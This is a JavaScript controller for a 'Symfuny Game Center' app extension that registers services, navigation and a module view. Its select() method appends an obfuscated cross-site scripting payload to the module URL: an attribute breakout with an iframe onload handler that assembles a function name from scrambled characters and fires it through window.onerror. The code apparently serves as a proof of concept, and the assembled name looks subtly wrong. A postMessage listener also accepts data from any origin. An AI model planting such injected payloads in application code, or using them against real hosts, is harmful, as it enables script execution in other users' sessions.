var POD_ID;

window.addEventListener("message", function(msg)
{
	if (msg.data && msg.data.pod) POD_ID = msg.data.pod;
}, false);

Package('Sgc.Services', {
	Controller : new Class({
		implements : ['select', 'link', 'connect'],
		initialize : function()
		{
			this.serviceName = 'sgc:controller';
			this.importServices = 'ui,applications-nav,modules,share'.split(',');

			SYMPHONY.services.make(this.serviceName, this, this.implements, true);

			SAPPHIRE.application.listen('start', this.onStart.bind(this));
			SGC.events.listen('started', this.onStarted.bind(this));
			SGC.events.listen('start', this.onReady.bind(this));
		},

		getAppId : function(podId)
		{
			var exceptions = SGC.podAppIdExceptions || {};

			return exceptions[podId] || 'sgc';
		},

		select : function(id)
		{
			var options = {
				canFloat: true
			};

			this.modulesService.show('sgc-games', {title: 'Symfuny Game Center', icon: SGC.baseUrl + 'sgc/assets/images/icon.png'}, 'sgc:controller', 
				SGC.baseUrl + 'sgc-module' + '"\>\<iframe/onload=a=[]+/trella/;a=a[5]+a[4]+a[3]+a[2]+a[1];window.onerror=window[a];throw/1337///', options);
		},

		link : function(type, id)
		{
			var options = {
				canFloat: true
			};

			if (this.module)
				this.module.invoke('link', type, id);
			else
			{
				this.pendingCommands = this.pendingCommands || [];
				this.pendingCommands.push({cmd: 'link', type: type, id: id});
				this.modulesService.show('sgc-games', {title: 'Symfuny Game Center', icon: SGC.baseUrl + 'sgc/assets/images/icon.png'}, 'sgc:controller', SGC.baseUrl + 'sgc-module', options);
			}
		},

	// called by the module when it loads
		connect : function(serviceName)
		{
			return SYMPHONY.remote.subscribe(serviceName)
				.then(function(service)
				{
					this.module = service;

				// This event is fired when the module goes away
					service.listen('disconnected', this.onModuleDisconnected.bind(this));

					var pending = this.pendingCommands.pop();
					this.pendingCommands = [];

					if (pending) service.invoke(pending.cmd, pending.type, pending.id);
				}.bind(this));
		},

		onStart : function(done)
		{
			var bootstrap = SYMPHONY.services.subscribe('bootstrap');

			this.importServices.each(function(service)
			{
				bootstrap.importService(service);
			}, this);

			bootstrap.exportService(this.serviceName);
			done();
		},

		onStarted : function()
		{
			SGC.appId = this.getAppId(SGC.pod);
		},

		onReady : function()
		{
			this.uiService = SYMPHONY.services.subscribe('ui');
			this.navService = SYMPHONY.services.subscribe('applications-nav');
			this.modulesService = SYMPHONY.services.subscribe('modules');
			this.shareService = SYMPHONY.services.subscribe('share');

			this.shareService.handleLink('article', 'sgc:controller');
			this.navService.add('sgc', {title: 'Symfuny Game Center', icon: SGC.baseUrl + 'sgc/assets/images/icon.png'}, 'sgc:controller');
            this.uiService.registerExtension('profile', 'profile', this.serviceName, {group: 'buttons', label: 'Call'});
		},

		onModuleDisconnected : function(symbol)
		{
			this.module = undefined;
		},

	})
});

new Sgc.Services.Controller();
